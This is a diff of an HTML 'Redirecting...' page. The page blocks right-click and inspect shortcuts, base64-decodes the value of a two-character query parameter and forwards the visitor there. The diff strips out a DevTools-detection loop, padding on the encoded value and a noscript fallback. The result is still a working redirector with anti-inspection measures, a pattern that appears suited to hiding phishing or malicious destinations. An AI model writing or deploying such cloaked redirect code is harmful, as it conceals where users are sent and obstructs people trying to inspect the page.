@@ -3,9 +3,8 @@
 <head>
   <meta charset="UTF-8">
   <title>Redirecting...</title>
-
   <script>
-    // Disable right-click and inspect shortcuts
+    // Disable right-click and common inspect shortcuts
     document.addEventListener('contextmenu', e => e.preventDefault());
     document.onkeydown = function(e) {
       if (
@@ -16,13 +15,6 @@
         return false;
       }
     };
-
-    // Optional DevTools detection
-    setInterval(function () {
-      if (window.outerWidth - window.innerWidth > 100 || window.outerHeight - window.innerHeight > 100) {
-        window.location.href = "about:blank";
-      }
-    }, 500);
   </script>
 
   <script>
@@ -30,25 +22,26 @@
       const params = new URLSearchParams(window.location.search);
       let encodedValue = '';
 
+      // Find first parameter key that is exactly 2 characters long
       for (const [key, value] of params.entries()) {
-        if (key.length === 2 && value.length > 6) {
-          // Remove first 3 and last 3 characters
-          encodedValue = value.substring(3, value.length - 3);
+        if (key.length === 2) {
+          encodedValue = value;
           break;
         }
       }
 
       if (encodedValue) {
         try {
-          const decodedURL = atob(encodedValue);
-          let finalURL = decodedURL;
+          const decodedURL = atob(encodedValue); // Base64 decode
 
+          let finalURL = decodedURL;
           if (!/^https?:\/\//i.test(finalURL)) {
-            finalURL = 'https://' + finalURL;
+            finalURL = 'http://' + finalURL;
           }
 
           window.location.href = finalURL;
         } catch (e) {
+          // Redirect to about:blank if decoding fails
           window.location.href = 'about:blank';
         }
       } else {
@@ -56,10 +49,6 @@
       }
     };
   </script>
-
-  <noscript>
-    <meta http-equiv="refresh" content="0;url=about:blank">
-  </noscript>
 </head>
 <body>
 </body>
